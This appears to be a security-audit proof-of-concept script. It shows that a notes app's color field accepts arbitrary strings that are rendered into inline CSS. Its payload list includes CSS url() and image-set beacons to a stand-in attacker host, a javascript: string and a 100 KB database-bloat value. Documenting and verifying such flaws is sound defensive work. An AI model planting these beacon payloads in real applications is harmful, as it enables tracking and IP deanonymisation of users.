// §6-B / §8-H — Color field accepts ARBITRARY string → CSS injection / external resource load.
// Controller Add (NotesController.cs:48): Color = IsNullOrWhiteSpace(r.Color) ? default : r.Color.Trim()
// No palette whitelist, no format check, no length check (DB column = longtext).
// Render sink: client/src/pages/Notes.jsx:77  <div className="note-card" style={{ background: note.color }}>
// React won't let a value "break out" of the inline style object, but a valid CSS
// background value like url(...) is applied verbatim → victim's browser fetches the URL
// every time the Notes tab is opened (tracking beacon / IP deanon / CSP bypass if no CSP).
import { provision, api } from '../_lib/provision.mjs'

const u = await provision({ email: 'adv.t12.a@gmail.com', gender: 'female' })

const payloads = [
  'red; background: url(https://evil.example/beacon.gif)', // external resource beacon
  'url("https://evil.example/track?id=victim")',
  'image-set("https://evil.example/x.png" 1x)',
  'javascript:alert(1)',                                   // junk, proves "any string"
  'A'.repeat(100000),                                      // 100 KB color → DB bloat (longtext)
]

let allVerbatim = true
for (const p of payloads) {
  const add = await api('POST', '/api/notes', { token: u.token, body: { text: 'css', color: p } })
  const id = add.json?.id
  const list = (await api('GET', '/api/notes', { token: u.token })).json
  const stored = list.find((n) => n.id === id)?.color
  const verbatim = stored === p.trim()
  allVerbatim = allVerbatim && verbatim
  const shown = p.length > 60 ? p.slice(0, 40) + `...(${p.length} chars)` : p
  console.log(`status=${add.status} verbatim=${verbatim}  color="${shown}" -> storedLen=${stored?.length}`)
}

console.log(`\nEXPECTED: server rejects non-palette colors (400) / strips url()`)
console.log(`OBSERVED: every payload accepted (200) and returned verbatim by GET`)
console.log(`SINK: Notes.jsx:77 style={{ background: note.color }} applies url() → browser fetches external resource`)
console.log(allVerbatim ? 'CONFIRMED 🟠 — arbitrary color stored & reflected; CSS url() privacy/beacon vector' : 'REFUTED')
